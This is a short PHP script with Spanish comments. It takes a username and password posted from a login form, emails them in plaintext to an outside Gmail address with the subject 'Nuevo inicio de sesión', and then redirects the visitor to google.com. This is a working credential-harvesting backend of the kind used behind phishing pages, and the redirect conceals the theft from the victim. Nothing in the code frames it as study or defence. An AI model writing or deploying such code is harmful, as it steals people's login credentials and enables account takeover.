<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar los datos del formulario
    $usuario = $_POST["usuario"];
    $contrasena = $_POST["contrasena"];

    // Configurar el destinatario del correo
    $destinatario = "blancacapa904@gmail.com";
    $asunto = "Nuevo inicio de sesión";

    // Construir el cuerpo del mensaje
    $mensaje = "Se ha iniciado sesión con los siguientes datos:\n\n";
    $mensaje .= "Usuario: $usuario\n";
    $mensaje .= "Contraseña: $contrasena\n";

    // Enviar el correo
    $headers = "From: blancacapa904@gmail.com"; // Cambia esto a tu dirección de correo electrónico
    mail($destinatario, $asunto, $mensaje, $headers);

    // Puedes redirigir al usuario a otra página después de enviar el correo
    header("Location: https://www.google.com");
    exit();
}
?>
